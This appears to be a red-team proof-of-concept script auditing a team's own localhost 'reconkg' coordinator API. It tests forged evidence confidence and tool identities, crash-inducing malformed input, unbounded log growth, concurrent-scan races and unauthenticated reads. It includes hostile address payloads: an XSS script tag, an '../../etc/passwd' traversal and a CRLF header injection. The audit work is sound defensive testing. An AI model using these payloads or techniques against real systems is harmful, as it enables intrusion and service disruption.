"""Red Cell PoCs against the reconkg coordinator (our own code, localhost).

Each function returns (finding_id, confirmed: bool, evidence: str).
Run against a live instance:  python audit/attack_poc.py
"""

from __future__ import annotations

import asyncio
import json
import sys

import httpx

BASE = "http://127.0.0.1:8942"
TOKEN = "b" * 24          # principal "scanner", from RECONKG_TOKENS
CLIENT = dict(base_url=BASE, timeout=20, trust_env=False,
              headers={"Authorization": f"Bearer {TOKEN}"})


def banner(msg):
    print(f"\n{'=' * 72}\n{msg}\n{'=' * 72}")


# --------------------------------------------------------------------------- #
# RC-01  Corroboration forgery
# --------------------------------------------------------------------------- #

async def rc01_confidence_injection(c: httpx.AsyncClient):
    """Evidence is trusted verbatim, including its own confidence score.

    `confidence` arrives in the POST body and is written straight onto the
    provenance record. An attacker does not need to defeat the confidence
    model -- they declare the output of it. A wholly fabricated host yields a
    max-priority weaponised lead.
    """
    target = "203.0.113.10"
    await c.post("/api/targets", json={"address": target})
    await c.post("/api/evidence", json={
        "tool": "nmap-sT", "address": target,
        "data": {"ports": [{"number": 80, "state": "open", "confidence": 1.0}]}})
    await c.post("/api/evidence", json={
        "tool": "nmap-sV", "address": target,
        "data": {"services": [{"port": 80, "service": "http",
                               "product": "Apache httpd", "version": "2.4.49",
                               "confidence": 1.0}]}})
    report = (await c.post(f"/api/targets/{target}/scan")).json()
    top = report["ledger"][0] if report["ledger"] else {}
    forged = len(top.get("independent_principals", [])) > 1 or \
        top.get("priority", 0) >= 0.9
    return ("RC-01", forged,
            f"declared 1.0 -> effective priority {top.get('priority')}, "
            f"principals {top.get('independent_principals')}")


async def rc01b_corroboration_forgery(c: httpx.AsyncClient):
    """Amplifier for RC-01: `source_tool` is a caller-supplied string treated
    as an independent identity. Two invented names carrying claims that are
    individually below the 0.45 correlation floor combine over it."""
    target = "203.0.113.15"
    await c.post("/api/targets", json={"address": target})
    await c.post("/api/evidence", json={
        "tool": "nmap-sT", "address": target,
        "data": {"ports": [{"number": 80, "state": "open", "confidence": 0.9}]}})
    # Below the floor on its own; nmap-sV left ambiguous so the fallback runs.
    await c.post("/api/evidence", json={
        "tool": "nmap-sV", "address": target,
        "data": {"services": [{"port": 80, "service": "http",
                               "product": "Apache httpd", "version": None,
                               "ambiguous": True, "confidence": 0.3}]}})
    await c.post("/api/evidence", json={
        "tool": "nmap-sV-intensity9", "address": target,
        "data": {"services": [{"port": 80, "service": "http",
                               "product": "Apache httpd", "version": "2.4.49",
                               "confidence": 0.3}]}})
    await c.post("/api/evidence", json={
        "tool": "whatweb", "address": target,
        "data": {"apps": [{"port": 80, "product": "Apache httpd",
                           "version": "2.4.49", "confidence": 0.3}]}})
    report = (await c.post(f"/api/targets/{target}/scan")).json()
    top = report["ledger"][0] if report["ledger"] else {}
    return ("RC-01b", bool(top),
            f"three tool labels from one principal -> "
            f"lead={top.get('cve_id')} priority={top.get('priority')} "
            f"principals={top.get('independent_principals')}")


# --------------------------------------------------------------------------- #
# RC-02  Pipeline crash via malformed observation
# --------------------------------------------------------------------------- #

async def rc02_crash_via_evidence(c: httpx.AsyncClient):
    """`_apply` only catches KeyError. A port number outside 1-65535 raises
    pydantic ValidationError, which escapes the stage isolation, the slot
    loop, and `run()` -- 500 on the endpoint and no ledger for the target."""
    target = "203.0.113.11"
    await c.post("/api/targets", json={"address": target})
    await c.post("/api/evidence", json={
        "tool": "nmap-sS", "address": target,
        "data": {"ports": [{"number": 99999, "state": "open"}]}})
    r = await c.post(f"/api/targets/{target}/scan")
    return ("RC-02", r.status_code >= 500,
            f"scan returned HTTP {r.status_code}")


async def rc02b_crash_via_bad_state(c: httpx.AsyncClient):
    """Same class, different door: PortState(obs.state) raises ValueError."""
    target = "203.0.113.12"
    await c.post("/api/targets", json={"address": target})
    await c.post("/api/evidence", json={
        "tool": "nmap-sS", "address": target,
        "data": {"ports": [{"number": 80, "state": "wide-open"}]}})
    r = await c.post(f"/api/targets/{target}/scan")
    return ("RC-02b", r.status_code >= 500,
            f"scan returned HTTP {r.status_code}")


# --------------------------------------------------------------------------- #
# RC-03  Unbounded memory growth
# --------------------------------------------------------------------------- #

async def rc03_provenance_flood(c: httpx.AsyncClient):
    """`provenance_log` and `store.event_log` are append-only and uncapped.
    Rescanning the same target grows both without bound."""
    target = "203.0.113.13"
    await c.post("/api/targets", json={"address": target})
    await c.post("/api/evidence", json={
        "tool": "nmap-sT", "address": target,
        "data": {"ports": [{"number": 80, "state": "open"}]}})
    await c.post("/api/evidence", json={
        "tool": "nmap-sV", "address": target,
        "data": {"services": [{"port": 80, "service": "http",
                               "product": "Apache httpd", "version": "2.4.49"}]}})
    before = (await c.get("/api/health")).json()["events_retained"]
    for _ in range(40):
        await c.post(f"/api/targets/{target}/scan")
    after = (await c.get("/api/health")).json()["events_retained"]
    graph = (await c.get(f"/api/targets/{target}")).json()
    log_len = len(graph["ports"][0]["provenance_log"])
    health = (await c.get("/api/health")).json()
    return ("RC-03", log_len > 60 or after > 5000,
            f"retained {before} -> {after} (cap 5000, emitted "
            f"{health['events_emitted']}); provenance_log = {log_len}")


# --------------------------------------------------------------------------- #
# RC-04  Address validation
# --------------------------------------------------------------------------- #

async def rc04_address_injection(c: httpx.AsyncClient):
    """`address` is any 1-253 char string and is interpolated into event
    paths broadcast to every analyst window."""
    payloads = ["<script>alert(1)</script>", "../../etc/passwd",
                "a" * 253, "10.0.0.1\r\nX-Injected: yes"]
    accepted = []
    for p in payloads:
        r = await c.post("/api/targets", json={"address": p})
        if r.status_code == 201:
            accepted.append(p[:30])
    return ("RC-04", bool(accepted),
            f"{len(accepted)}/{len(payloads)} hostile addresses accepted: {accepted}")


# --------------------------------------------------------------------------- #
# RC-05  Concurrent scans of one target
# --------------------------------------------------------------------------- #

async def rc05_concurrent_scan_race(c: httpx.AsyncClient):
    """`_downgrade` and `_correlate` iterate live graph lists while another
    scan of the same target mutates them. The store lock does not cover
    read-iterate-await sequences in the engine."""
    target = "203.0.113.14"
    await c.post("/api/targets", json={"address": target})
    await c.post("/api/evidence", json={
        "tool": "nmap-sT", "address": target,
        "data": {"ports": [{"number": p, "state": "open"} for p in range(80, 120)]}})
    await c.post("/api/evidence", json={
        "tool": "nmap-sV", "address": target,
        "data": {"services": [
            {"port": p, "service": "http", "product": "Apache httpd",
             "version": None, "ambiguous": True} for p in range(80, 120)]}})
    await c.post("/api/evidence", json={
        "tool": "nmap-sV-intensity9", "address": target,
        "data": {"services": [
            {"port": p, "service": "http", "product": "Apache httpd",
             "version": "2.4.49"} for p in range(80, 120)]}})

    results = await asyncio.gather(
        *[c.post(f"/api/targets/{target}/scan") for _ in range(8)],
        return_exceptions=True)
    codes = [getattr(r, "status_code", type(r).__name__) for r in results]
    graph = (await c.get(f"/api/targets/{target}")).json()
    dupes = len(graph["ports"]) != len({p["number"] for p in graph["ports"]})
    return ("RC-05", any(c_ != 200 for c_ in codes) or dupes,
            f"codes={codes} duplicate_ports={dupes} ports={len(graph['ports'])}")


# --------------------------------------------------------------------------- #
# RC-06  Unauthenticated read of the whole graph
# --------------------------------------------------------------------------- #

async def rc06_unauth_read(c: httpx.AsyncClient):
    async with httpx.AsyncClient(base_url=BASE, timeout=20,
                                 trust_env=False) as anon:
        r = await anon.get("/api/targets")
    return ("RC-06", r.status_code == 200,
            f"anonymous GET /api/targets -> HTTP {r.status_code}")


async def main():
    async with httpx.AsyncClient(**CLIENT) as c:
        checks = [rc01_confidence_injection, rc01b_corroboration_forgery,
                  rc02_crash_via_evidence,
                  rc02b_crash_via_bad_state, rc03_provenance_flood,
                  rc04_address_injection, rc05_concurrent_scan_race,
                  rc06_unauth_read]
        banner("RED CELL PoC RUN")
        rows = []
        for fn in checks:
            try:
                rows.append(await fn(c))
            except Exception as exc:
                rows.append((fn.__name__, "ERROR", f"{type(exc).__name__}: {exc}"))
        for fid, confirmed, evidence in rows:
            mark = "CONFIRMED" if confirmed is True else str(confirmed)
            print(f"{fid:8} {mark:10} {evidence}")


if __name__ == "__main__":
    asyncio.run(main())
